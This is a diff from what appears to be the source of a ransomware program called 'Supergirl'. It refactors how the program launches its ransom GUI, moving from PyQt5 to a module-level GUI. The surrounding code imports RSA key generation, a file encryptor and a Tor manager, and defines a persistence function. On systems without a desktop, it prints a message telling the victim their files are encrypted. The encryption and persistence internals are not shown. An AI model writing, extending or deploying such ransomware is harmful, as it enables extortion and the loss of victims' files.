@@ -11,13 +11,12 @@ import Config
 from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.backends import default_backend
-from PyQt5.QtWidgets import QApplication
 from RSA.RSAKeyGen import RSAKeyGen
 from pathlib import Path
 from Helper import Helper
 from FileCrypter import FileCrypter
 from TorManager import TorManager
-from GUI import GUI
+import GUI
 
 _helper = Helper()
 _session = 0
@@ -46,18 +45,18 @@ def init():
 def startGui(id):
     if sys.platform == "linux" or sys.platform == "linux2":
         if not os.environ.get('XDG_CURRENT_DESKTOP') is None:
-            app = QApplication(sys.argv)
-            _ = GUI(id)
-            sys.exit(app.exec_())
+            GUI.uuid = id
+            GUI.setup()
+            GUI.show()
         else:
             _helper.super_logo()
             _helper.supergirl_pic()
             print("Supergirl needs a GUI. She encrypted your Files and you are screwed")
             print("Have a nice Day! ;)")
     else:
-        app = QApplication(sys.argv)
-        _ = GUI(id)
-        sys.exit(app.exec_())
+        GUI.uuid = id
+        GUI.setup()
+        GUI.show()
 
 def makePersistence():
     if getattr(sys, 'frozen', False):
